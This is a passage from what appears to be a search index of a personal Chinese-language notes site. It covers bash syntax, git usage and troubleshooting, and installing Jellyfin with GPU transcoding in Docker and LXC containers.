<pre><code>PATH=\"${PATH:+${PATH}:}/staff/fyyuan/.fzf/bin\"\n</code></pre></p> </li> <li> <p>\u5b50\u5b57\u7b26\u4e32\u66ff\u6362</p> </li> </ul> <p><code>${parameter: offset}</code> <code>${parameter: offset: length}</code></p> <p>This is referred to as Substring Expansion. It expands to up to\u00a0length\u00a0characters of the value of\u00a0parameter\u00a0starting at the character specified by\u00a0offset.</p> <pre><code>$ string=01234567890abcdefgh\n$ echo ${string:7}\n7890abcdefgh\n$ echo ${string:7:0}\n\n$ echo ${string:7:2}\n78\n$ echo ${string:7:-2}\n7890abcdef\n$ echo ${string: -7}\nbcdefgh\n$ echo ${string: -7:0}\n\n$ echo ${string: -7:2}\nbc\n$ echo ${string: -7:-2}\nbcdef\n</code></pre>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u547d\u4ee4\u66ff\u6362\u6269\u5c55","title":"\u547d\u4ee4\u66ff\u6362(\u6269\u5c55)","text":"<p>\u4e24\u79cd\u683c\u5f0f</p> <pre><code>VAR=$(cat file1.txt nofile.txt 2&gt;&amp;1)\necho $VAR\n\n`command`\n</code></pre> <p>\u547d\u4ee4\u66ff\u6362\u5c31\u662f\u5c06\u4e00\u4e2a\u547d\u4ee4\u7684\u7ed3\u679c\uff08\u8f93\u51fa\uff0c\u9ed8\u8ba4\u4e3astdout\uff09\u66ff\u6362\u5230\u5f53\u524d\u4f4d\u7f6e\uff0c\u6bd4\u5982\u7ed9\u53d8\u91cf\u8d4b\u503c\uff0c\u6216\u8005\u5d4c\u5165\u5b57\u7b26\u4e32\u4e2d\u3002</p> <p>Bash performs the expansion by executing\u00a0command\u00a0in a subshell environment and replacing the command substitution with the standard output of the command, with any trailing newlines deleted.</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u83b7\u5f97\u547d\u4ee4\u8f93\u51fa\u6362\u884c\u6d88\u5931\u95ee\u9898","title":"\u83b7\u5f97\u547d\u4ee4\u8f93\u51fa\uff0c\u6362\u884c\u6d88\u5931\u95ee\u9898","text":"<p>How to avoid bash command substitution to remove the newline character? - Stack Overflow</p> <p><code>echo $var</code>\u65f6\uff0c\u4e0d\u4f1a\u663e\u793a\u6362\u884c\u3002\u9700\u8981\u4f7f\u7528\u53cc\u5f15\u53f7<code>echo \"$var\"</code></p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u6761\u4ef6\u5224\u65ad","title":"\u6761\u4ef6\u5224\u65ad","text":"","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u547d\u4ee4","title":"<code>[]</code>\u547d\u4ee4","text":"<p><code>[ EXPRESSION ]</code> \u7b49\u4ef7\u4e8e<code>test EXPRESSION</code></p> <ul> <li><code>STRING1 = STRING2</code>: the strings are equal</li> <li><code>STRING1 != STRING2</code>: the strings are not equal</li> <li><code>INTEGER1 -eq INTEGER2</code>: INTEGER1 is equal to INTEGER2</li> <li><code>INTEGER1 -ge INTEGER2</code>: INTEGER1 is greater than or equal to INTEGER2          </li> <li><code>-n STRING</code>: the length of STRING is nonzero</li> <li><code>-z STRING</code>: the length of STRING is zero</li> <li><code>-d FILE</code>: FILE exists and is a directory</li> <li><code>-e FILE</code>: FILE exists</li> <li><code>-f FILE</code>: FILE exists and is a regular file</li> <li><code>arg1\u00a0OP\u00a0arg2</code><ul> <li><code>OP</code>\u00a0is one of \u2018-eq\u2019, \u2018-ne\u2019, \u2018-lt\u2019, \u2018-le\u2019, \u2018-gt\u2019, or \u2018-ge\u2019. These arithmetic binary operators return true if\u00a0arg1\u00a0is equal to, not equal to, less than, less than or equal to, greater than, or greater than or equal to\u00a0arg2, respectively.\u00a0Arg1\u00a0and\u00a0arg2\u00a0may be positive or negative integers. When used with the\u00a0<code>[[</code>\u00a0command,\u00a0Arg1\u00a0and\u00a0Arg2\u00a0are evaluated as arithmetic expressions (see\u00a0Shell Arithmetic).</li> </ul> </li> </ul> <p>\u6761\u4ef6\u8868\u8fbe\u5f0f Bash Reference Manual (gnu.org)</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#-vs--vs--vs-","title":"<code>[[</code> vs <code>[</code> vs <code>(</code> vs <code>((</code>","text":"<p>shell - What is the difference between the Bash operators <code>[[</code> vs <code>[</code> vs <code>(</code> vs <code>((</code>? - Unix &amp; Linux Stack Exchange</p> <ul> <li><code>if [ condition ]</code></li> </ul> <p><code>[</code> is another name for the traditional <code>test</code> command. <code>[</code> / <code>test</code> is a standard POSIX utility. All POSIX shells have it builtin (though that's not required by POSIX\u00b2). The <code>test</code> command sets an exit code and the <code>if</code> statement acts accordingly. Typical tests are whether a file exists or one number is equal to another.</p> <ul> <li><code>if [[ condition ]]</code></li> </ul> <p>This is a new upgraded variation on <code>test</code>\u00b9 from ksh that bash, zsh, yash, busybox sh also s matchesupport. This <code>[[ ... ]]</code> construct also sets an exit code and the <code>if</code> statement acts accordingly. Among its extended features, it can test whether a string a wildcard pattern (not in busybox sh).</p> <ul> <li><code>if ((condition))</code></li> </ul> <p>Another ksh extension that bash and zsh also support. This performs arithmetic. As the result of the arithmetic, an exit code is set and the <code>if</code> statement acts accordingly. It returns an exit code of zero (true) if the result of the arithmetic calculation is nonzero. Like <code>[[...]]</code>, this form is not POSIX and therefore not portable.</p> <ul> <li><code>if (command)</code></li> </ul> <p>This runs command in a subshell. When command completes, it sets an exit code and the <code>if</code> statement acts accordingly.</p> <p>A typical reason for using a subshell like this is to limit side-effects of <code>command</code> if <code>command</code> required variable assignments or other changes to the shell's environment. Such changes do not remain after the subshell completes.</p> <ul> <li><code>if command</code></li> </ul> <p>command is executed and the <code>if</code> statement acts according to its exit code.</p>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u6b63\u5219\u5224\u65ad","title":"\u6b63\u5219\u5224\u65ad","text":"<p><code>[[ expression ]]</code>\u5185expression\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u5224\u65ad https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#index-_005b_005b</p> <ul> <li><code>==</code>, <code>!=</code>\uff1a</li> <li>A == B\u8868\u793a\u5b57\u7b26\u4e32A\u5339\u914dB\u3002!=\u8868\u793a\u4e0d\u5339\u914d\u3002</li> <li>\u5339\u914d\u89c4\u5219\uff1aBash Reference Manual (gnu.org)</li> <li><code>=~</code>\uff1ausing the POSIX <code>regcomp</code> and <code>regexec</code> interfaces usually described in regex(3)</li> <li>\u903b\u8f91\u8fde\u63a5</li> <li>! expression</li> <li>expression1 &amp;&amp; expression2</li> <li>expression1 || expression2<ul> <li>&amp;&amp;\u548c||\u5747\u6709\u77ed\u8def\u64cd\u4f5c\uff08\u4e0d\u5fc5\u5224\u65ad\u5168\u90e8\u8868\u8fbe\u5f0f\uff09</li> </ul> </li> </ul> <p>\u4f8b\u5b50\uff1a</p> <pre><code>pattern='[[:space:]]*(a)?b'\n[[ $line =~ $pattern ]]\n</code></pre> <pre><code>if [[ $digit =~ [0-9] ]]; then\n    echo \"$digit is a digit\"\nelse\n    echo \"oops\"\nfi\n</code></pre>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u547d\u4ee4\u5e8f\u5217","title":"\u547d\u4ee4\u5e8f\u5217","text":"<p>\u547d\u4ee4\u8fde\u63a5\u7b26</p> <p>Bash Reference Manual (gnu.org)- list of command</p> <ul> <li><code>;</code>: \u547d\u4ee4\u987a\u5e8f\u6267\u884c</li> <li><code>&amp;&amp;</code>: \u53ea\u6709\u524d\u4e00\u6761\u6210\u529f\u8fd0\u884c\u624d\u8fd0\u884c\u7b2c\u4e8c\u6761</li> <li><code>||</code>: \u524d\u9762\u5931\u8d25\u624d\u8fd0\u884c\u540e\u4e00\u6761</li> <li><code>&amp;</code>: \u547d\u4ee4\u540e\u53f0\u8fd0\u884c\uff0c\u4e5f\u53eb\u5f02\u6b65\u547d\u4ee4\uff08asynchronous\u00a0commands\uff09The shell does not wait for the command to finish, and the return status is 0 (true)</li> </ul>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#\u5176\u5b83_1","title":"\u5176\u5b83","text":"","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#here-documenteof","title":"here-document(&lt;&lt;EOF)","text":"<p>\u7528\u4e8e\u7ed9\u7a0b\u5e8f\u63d0\u4f9b\u591a\u884c\u6587\u672c\u8f93\u5165(text)\uff0cEOF\u8868\u793a\u5206\u9694\u7b26\uff0c\u53ef\u4ee5\u662f\u5176\u5b83\u5b57\u7b26\u4e32\u3002</p> <p>\u53ef\u7528\u4e8e\u907f\u514d\u4ea4\u4e92\u8f93\u5165\uff0c\u6bd4\u5982passwd\u65f6\u4f1a\u4ea4\u4e92\u5f0f\u5730\u8f93\u5165\u5bc6\u7801\uff0c\u4f7f\u7528here-document\u5c06\u8f93\u5165\u63d0\u524d\u51c6\u5907\u597d\u5373\u53ef\u3002</p> <pre><code>$ wc &lt;&lt; EOF\n&gt; one two three\n&gt; four five\n&gt; EOF\n 2  5 24\n</code></pre>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#here-string","title":"here-string(&lt;&lt;&lt;)","text":"<p>\u5c06\u4e00\u4e2a\u63d0\u524d\u51c6\u5907\u597d\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u7a0b\u5e8f\u8f93\u5165\uff0c\u540c\u6837\u7528\u4e8e\u907f\u514d\u4ea4\u4e92\u3002</p> <pre><code>bc &lt;&lt;&lt; 5*4  #\u7b49\u4ef7\u4e8eecho '5*4' | bc\n</code></pre>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/20/2022-11-20-bash/#bash\u4e2d\u8c03\u7528python","title":"bash\u4e2d\u8c03\u7528python","text":"<pre><code>set -x\nvar=\"/path/to/file.ext\"\noutput=$(python &lt;&lt;EOF\nvar=\"$var\"\nvar=var.split('/')[-1].split('.')[0]\nprint(var)\nEOF\n)\n\n#output=$(python -c 'var=\"'$var'\";var=var.split(\"/\")[-1].split(\".\")[0];print(var)')\necho $output\n</code></pre>","tags":["bash"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/","title":"git","text":"<p>git</p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#tag","title":"tag","text":"<pre><code>#\u663e\u793a\u6240\u6709tag\ngit tag\n#\u663e\u793a\u5177\u4f53tag\u4fe1\u606f\ngit show v1.2\n#\u6dfb\u52a0tag\ngit tag v1.2 9fceb02 -a\ngit tag v1.2 9fceb02 -a -m \"my tag\"\n#\u5220\u9664tag\ngit tag -d v1.2\n#\u63a8\u9001tag\u5230\u8fdc\u7a0b\ngit push origin --tags\n</code></pre>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#shallow-clone","title":"shallow clone","text":"<p>\u907f\u514dclone\u7684\u4ed3\u5e93\u592a\u5927\uff0c\u5c06git commit\u8bb0\u5f55\u622a\u65ad\u3002 <pre><code>git clone --depth 1 git://gcc.gnu.org/git/gcc.git\n</code></pre></p> <p><code>man git-clone</code> Create a shallow clone with a history truncated to the specified number of commits. Implies <code>--single-branch</code> unless <code>--no-single-branch</code> is given to fetch the histories near the tips of all branches. If you want to clone submodules shallowly, also pass <code>shallow-submodules</code>.</p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u4ee3\u7406","title":"\u4ee3\u7406","text":"","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f","title":"\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f","text":"<ul> <li><code>GIT_TRACE=1</code></li> <li><code>git --verbose &lt;cmd&gt;</code></li> </ul>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#http\u548chttps\u8bbe\u7f6e\u4ee3\u7406","title":"http\u548chttps\u8bbe\u7f6e\u4ee3\u7406","text":"","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#ssh\u4ee3\u7406","title":"ssh\u4ee3\u7406","text":"","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#windows","title":"windows","text":"<p>windows\u4e0b\u6ca1\u6709nc\u547d\u4ee4\uff0c\u9700\u8981connect.exe\uff08\u53ef\u4ee5\u4e0b\u8f7d.c\u6587\u4ef6\u7f16\u8bd1\u6210exe\u6587\u4ef6\uff09</p> <p>SSH in git behind proxy on windows 7 - Stack Overflow</p> <pre><code>Host github.com\n  HostName github.com\n  ...\n  ProxyCommand connect -H 127.0.0.1:11223 %h %p\n</code></pre>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#\u62a5\u9519","title":"\u62a5\u9519","text":"","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#unsafe-directory","title":"unsafe directory","text":"<p>git - Fatal error \"unsafe repository ('/home/repon' is owned by someone else)\" - Stack Overflow</p> <p>git version &gt; Git 2.36</p> <p><code>git config --global --add safe.directory '*'</code></p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#curl-92-http2-stream-0-was-not-closed-cleanly-cancel-err-8","title":"curl 92 HTTP/2 stream 0 was not closed cleanly: CANCEL (err 8)","text":"<pre><code>\u279c  repo git clone https://github.com/YaoFANGUK/video-subtitle-generator\nCloning into 'video-subtitle-generator'...\nremote: Enumerating objects: 434, done.\nremote: Counting objects: 100% (95/95), done.\nremote: Compressing objects: 100% (53/53), done.\nerror: RPC failed; curl 92 HTTP/2 stream 0 was not closed cleanly: CANCEL (err 8)\nerror: 503 bytes of body are still expected\nfetch-pack: unexpected disconnect while reading sideband packet\nfatal: early EOF\nfatal: fetch-pack: invalid index-pack output\n</code></pre> <p>git - error: RPC failed; curl 92 HTTP/2 stream 0 was not closed cleanly: PROTOCOL_ERROR (err 1) - Stack Overflow <pre><code>git config --global http.version HTTP/1.1\n</code></pre></p> <p>\u6210\u529f <pre><code>\u279c  repo git clone https://github.com/YaoFANGUK/video-subtitle-generator\nCloning into 'video-subtitle-generator'...\nremote: Enumerating objects: 434, done.\nremote: Counting objects: 100% (95/95), done.\nremote: Compressing objects: 100% (53/53), done.\nremote: Total 434 (delta 46), reused 87 (delta 42), pack-reused 339\nReceiving objects: 100% (434/434), 5.92 GiB | 21.39 MiB/s, done.\nResolving deltas: 100% (149/149), done.\nUpdating files: 100% (151/151), done.\n</code></pre></p> <p>\u8c8c\u4f3c\u4fee\u6539buffer\u4e5f\u53ef\u4ee5\uff1aGIT\u63a8\u9001\u9519\u8beferror: RPC failed\uff1b curl 92 HTTP/2 stream 0 was not closed cleanly: CANCEL (err 8) - \u90ed\u5c0f\u777f - \u535a\u5ba2\u56ed (cnblogs.com) <pre><code>git config --global http.postBuffer 524288000\n</code></pre></p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#patch","title":"patch","text":"<p>Git \u6253\u8865\u4e01-- patch \u548c diff \u7684\u4f7f\u7528\uff08\u8be6\u7ec6\uff09 - \u6398\u91d1 (juejin.cn)</p> <p>Git \u63d0\u4f9b\u4e86\u4e24\u79cd\u8865\u4e01\u65b9\u6848\uff0c\u4e00\u662f\u7528git diff\u751f\u6210\u7684UNIX\u6807\u51c6\u8865\u4e01.diff\u6587\u4ef6\uff0c\u4e8c\u662fgit format-patch\u751f\u6210\u7684Git\u4e13\u7528.patch \u6587\u4ef6\u3002 .diff\u6587\u4ef6\u53ea\u662f\u8bb0\u5f55\u6587\u4ef6\u6539\u53d8\u7684\u5185\u5bb9\uff0c\u4e0d\u5e26\u6709commit\u8bb0\u5f55\u4fe1\u606f,\u591a\u4e2acommit\u53ef\u4ee5\u5408\u5e76\u6210\u4e00\u4e2adiff\u6587\u4ef6\u3002 .patch\u6587\u4ef6\u5e26\u6709\u8bb0\u5f55\u6587\u4ef6\u6539\u53d8\u7684\u5185\u5bb9\uff0c\u4e5f\u5e26\u6709commit\u8bb0\u5f55\u4fe1\u606f,\u6bcf\u4e2acommit\u5bf9\u5e94\u4e00\u4e2apatch\u6587\u4ef6\u3002</p> <pre><code>git format-patch \u3010commit sha1 id\u3011-n # \ngit format-patch \u3010commit sha1 id\u3011..\u3010commit sha1 id\u3011 # \u67d0\u4e24\u6b21\u63d0\u4ea4\u4e4b\u95f4\u7684\u6240\u6709patch\n</code></pre> <pre><code>git am \u3010path/to/xxx.patch\u3011\n</code></pre> <p>git diff\u76f8\u5173 <pre><code>git diff \u3010commit sha1 id\u3011 \u3010commit sha1 id\u3011 &gt; \u3010diff\u6587\u4ef6\u540d\u3011\ngit diff --no-index file1 file2 # \u975egit repo\u4e0b\uff0c\u751f\u6210\u4e24\u4e2a\u6587\u4ef6diff\n</code></pre></p> <pre><code>git apply [--check] \u3010path/to/xxx.patch\ngit apply --check \u3010path/to/xxx.diff\u3011\n</code></pre>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#format-patch","title":"format-patch","text":"<p>Git - git-format-patch Documentation (git-scm.com)</p> <p>Prepare each non-merge commit with its \"patch\" in one \"message\" per commit, formatted to resemble a UNIX mailbox. The output of this command is convenient for e-mail submission or for use with\u00a0git am.</p> <pre><code>git diff\u00a0[&lt;options&gt;] --no-index [--] &lt;path&gt; &lt;path&gt;\n</code></pre> <p>This form is to compare the given two paths on the filesystem. You can omit the\u00a0<code>--no-index</code>\u00a0option when running the command in a working tree controlled by Git and at least one of the paths points outside the working tree, or when running the command outside a working tree controlled by Git.</p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#submodule","title":"submodule","text":"<p>\u53ef\u4ee5\u672c\u5730\u6dfb\u52a0submodule <pre><code>git submodule add ./third-party/nvbit_release third-party/nvbit_release\n</code></pre></p> <p>\u6dfb\u52a0submodule\u540e\u4f1a\u751f\u6210<code>.gitmodules</code>\u6587\u4ef6 <pre><code>[submodule \"third-party/gpu-rodinia\"]\n        path = third-party/gpu-rodinia\n        url = ./third-party/gpu-rodinia\n[submodule \"third-party/nvbit_release\"]\n        path = third-party/nvbit_release\n        url = ./third-party/nvbit_release\n[submodule \"third-party/cuda-samples\"]\n        path = third-party/cuda-samples\n        url = ./third-party/cuda-samples\n[submodule \"third-party/gpu-parboil\"]\n        path = third-party/gpu-parboil\n        url = ./third-party/gpu-parboil\n</code></pre></p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#clone-submodule","title":"clone submodule","text":"<p>clone\u65f6\u9ed8\u8ba4\u662f\u4e0d\u4f1aclone\u5b50\u6a21\u5757\u7684\uff0c\u9700\u8981\u6dfb\u52a0recursive\u3002-j8\u8868\u793a\u4f7f\u7528\u591a\u7ebf\u7a0b\u4e0b\u8f7d\u3002 <pre><code>git clone --recursive -j8 gpu-analysis-model gpu-analysis-model-70\n</code></pre></p> <p>\u4f1a\u4ece<code>.gitmodules</code>\u4e2d\u6307\u5b9a\u7684url\u4e2dclone \u4ed3\u5e93\uff0c\u7136\u540echeckout\u5230\u5bf9\u5e94commit\u3002\u5982\u679c\u662f\u672c\u5730commit\uff0c\u6ca1\u6709\u63a8\u9001\u5230\u8fdc\u7a0b\uff0c\u5219\u4f1a\u56e0\u4e3a\u6ca1\u6709\u5bf9\u5e94commit\u800c\u62a5\u9519\u3002\u89e3\u51b3\u65b9\u6cd5\u662f\u6539\u7528\u672c\u5730\u4ed3\u5e93\u4f5c\u4e3aurl\u3002</p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/28/2022-11-28-git/#file-not-allowed\u95ee\u9898","title":"file not allowed\u95ee\u9898","text":"<p><pre><code>Submodule 'third-party/cuda-samples' (/staff/fyyuan/repo/gpu-analysis-model/third-party/cuda-samples) registered for path 'third-party/cuda-samples'\n\nCloning into '/staff/fyyuan/repo/gpu-analysis-model-70/third-party/cuda-samples'...\nfatal: transport 'file' not allowed\n</code></pre> \u89e3\u51b3\u65b9\u6cd5 <pre><code>git config --global protocol.file.allow always\n</code></pre></p>","tags":["git"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/","title":"jellyfin\u76f8\u5173","text":"<p>\u8bb0\u5f55jellyfin\u76f8\u5173\u4f7f\u7528</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#docker\u5b89\u88c5jellyfin","title":"docker\u5b89\u88c5jellyfin","text":"<p>\u53c2\u8003\uff1aContainer | Jellyfin \u4e09\u4e2a\u4e0d\u540c\u955c\u50cf\u6e90\uff1a - Official container image:\u00a0<code>jellyfin/jellyfin</code> . - LinuxServer.io image:\u00a0<code>linuxserver/jellyfin</code> . - hotio image:\u00a0<code>hotio/jellyfin</code> .</p> <p>\u67e5\u770b\u5b83\u4eec\u7684Dockerfile\uff0c\u53ef\u4ee5\u770b\u5230\u5b89\u88c5\u4e86\u4e0d\u540c\u663e\u5361\u7684\u9a71\u52a8\uff0c\u5305\u542bva-api\uff0copencl\u3002 <pre><code>nvidia-opencl-icd-340 \\\ni965-va-driver \\\nmesa-va-drivers &amp;&amp; \\\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#gpu\u8f6c\u7801\u786c\u4ef6\u52a0\u901f","title":"gpu\u8f6c\u7801\u786c\u4ef6\u52a0\u901f","text":"<p>Intel GPU | Jellyfin</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#devdri","title":"dev/dri","text":"<p>\u9ed8\u8ba4\u5df2\u7ecf\u8bbe\u7f6e\u597d\u7528\u6237\u6743\u9650\u4e86</p> <p>docker-compose\u4e2d\u8bbe\u7f6e <pre><code>devices:\n      - /dev/dri/:/dev/dri/\n</code></pre></p> <pre><code>root@689728fac458:/# l -alh /dev/dri\ntotal 0\ndrwxr-xr-x 2 root root                80 Sep 29 19:41 ./\ndrwxr-xr-x 6 root root               360 Sep 29 19:41 ../\ncrw-rw---- 1 root video         226,   0 Sep 29 19:41 card0\ncrw-rw---- 1 root videoGaFCwCBc 226, 128 Sep 29 19:41 renderD128\nroot@689728fac458:/# id 1000\nuid=1000(abc) gid=1000(abc) groups=1000(abc),44(video),100(users),104(videoGaFCwCBc)\nroot@689728fac458:/#\n</code></pre>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#nvidia-gpu","title":"nvidia gpu","text":"<p>NVIDIA GPU | Jellyfin <pre><code>version: '3'\nservices:\n  jellyfin:\n    image: jellyfin/jellyfin\n    user: 1000:1000\n    network_mode: 'host'\n    volumes:\n      - /path/to/config:/config\n      - /path/to/cache:/cache\n      - /path/to/media:/media\n    runtime: nvidia\n    deploy:\n      resources:\n        reservations:\n          devices:\n            - capabilities: [gpu]\n</code></pre></p> <p>Installing the NVIDIA Container Toolkit \u2014 container-toolkit 1.14.1 documentation <pre><code>sudo nvidia-ctk runtime configure --runtime=docker\n\nsudo systemctl restart docker\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#lxc\u5b89\u88c5jellyfin","title":"LXC\u5b89\u88c5jellyfin","text":"<p>\u76f8\u5bf9\u4e8edocker\u597d\u5904\uff1adocker\u6211\u6ca1\u6709\u89e3\u51b3amd gpu\u65e0\u6cd5\u8c03\u7528opencl\u8fdb\u884cHDR\u8272\u8c03\u6620\u5c04\u95ee\u9898\u3002\u800c\u5728lxc\u4e2d\u901a\u8fc7amd\u5b98\u65b9\u9a71\u52a8\u5b89\u88c5\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u624b\u52a8\u5b89\u88c5opencl\u9a71\u52a8\uff0c\u53ef\u4ee5\u89e3\u51b3\u8be5\u95ee\u9898\u3002</p> <ol> <li>\u5b89\u88c5lxd\uff08lxc\u7684\u524d\u7aef\uff09\u3002ubuntu\u4e0b\u9ed8\u8ba4\u4f7f\u7528snap\u5b89\u88c5</li> <li>\u521b\u5efalxc\u5bb9\u5668\u3002\u4f7f\u7528\u9ed8\u8ba4\u914d\u7f6e\u3002\u5bb9\u5668\u4f7f\u7528\u9ed8\u8ba4\u7684lxdbr0\u7f51\u7edc\uff0c\u901a\u8fc7NAT\u5230\u5bbf\u4e3b\u673a\u4e0a\u7f51\u3002 <pre><code>lxc launch -p default images:ubuntu/focal ubuntu20\n</code></pre></li> <li>\u5b89\u88c5Jellyfin <pre><code># \u5b89\u88c5\u4f9d\u8d56\nsudo apt install curl gnupg\n\n# \u6dfb\u52a0jellyfin\u6e90\nsudo mkdir -p /etc/apt/keyrings\ncurl -fsSL https://repo.jellyfin.org/jellyfin_team.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/jellyfin.gpg\n\ncat &lt;&lt;EOF | sudo tee /etc/apt/sources.list.d/jellyfin.sources\nTypes: deb\nURIs: https://repo.jellyfin.org/$( awk -F'=' '/^ID=/{ print $NF }' /etc/os-release )\nSuites: $( awk -F'=' '/^VERSION_CODENAME=/{ print $NF }' /etc/os-release )\nComponents: main\nArchitectures: $( dpkg --print-architecture )\nSigned-By: /etc/apt/keyrings/jellyfin.gpg\nEOF\n\n# \u5b89\u88c5\nsudo apt update\nsudo apt install jellyfin\n\n# \u542f\u52a8jellyfin\u670d\u52a1\nsystemctl enable jellyfin\nsystemctl start jellyfin\n</code></pre></li> </ol>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u7aef\u53e3\u6620\u5c04","title":"\u7aef\u53e3\u6620\u5c04","text":"<p>lxc\u7684\u7aef\u53e3\u6620\u5c04\u6ca1\u6709\u90a3\u4e48\u76f4\u89c2\uff0c\u662f\u901a\u8fc7\u5728\u5bb9\u5668\u914d\u7f6e\u4e2d\u6dfb\u52a0device\u5b9e\u73b0\u7684\u3002\u6709\u4e24\u79cd\u65b9\u5f0f\u7ed9\u8bbe\u5907\uff1a1\uff09\u901a\u8fc7<code>lxc config</code>\u7ed9\u5bb9\u5668\u6dfb\u52a0\u8bbe\u5907\uff08\u4e5f\u53ef\u4ee5<code>lxc config edit</code>\u76f4\u63a5\u4fee\u6539\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\uff092\uff09\u521b\u5efaprofile\uff0c\u5e76\u7ed9\u5bb9\u5668\u6dfb\u52a0profile\u3002 \u4e3a\u4e86\u4ee5\u540e\u77e5\u9053\u8bbe\u7f6e\u4e86\u54ea\u4e9b\u7aef\u53e3\u6620\u5c04\uff0c\u63a8\u8350\u4f7f\u7528profile\u65b9\u5f0f\u3002 <pre><code>lxc profile device add &lt;profile&gt; &lt;device name&gt; &lt;device type&gt; &lt;key=value&gt;*\nlxc profile add &lt;container&gt; &lt;profile&gt;\n\nlxc config device add &lt;container&gt; &lt;device name&gt; &lt;device type&gt; &lt;key=value&gt;*\n</code></pre> \u4f8b\u5b50\uff1a <pre><code>lxc profile create proxy-jellyfin\nlxc profile device add proxy-jellyfin proxy8096 proxy connect=\"tcp:127.0.0.1:8096\" listen=\"tcp:0.0.0.0:8096\"\nlxc profile add ubuntu20 proxy-jellyfin\n</code></pre> \u67e5\u770b\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6 <pre><code>lxc config show ubuntu20 --expanded\n\ndevices:\n  proxy8096:\n    connect: tcp:127.0.0.1:8096\n    listen: tcp:0.0.0.0:8097\n    type: proxy\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u76ee\u5f55\u6620\u5c04","title":"\u76ee\u5f55\u6620\u5c04","text":"<p>\u53c2\u8003\uff1aHow to add or mount directory in LXD (Linux container) - nixCraft (cyberciti.biz)</p> <p>\u76ee\u5f55\u6620\u5c04\u540c\u6837\u9700\u8981\u7ed9\u5bb9\u5668\u6dfb\u52a0device\u3002 <pre><code>lxc config device add ubuntu20 media disk source=/path/to/media_lib path=/media\n</code></pre></p> <p>\u5bf9\u5e94\u914d\u7f6e\u6587\u4ef6 <pre><code>devices:\n  media:\n    path: /media\n    source: /path/to/media_lib\n    type: disk\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#subordinate-uidgid\u6620\u5c04","title":"subordinate 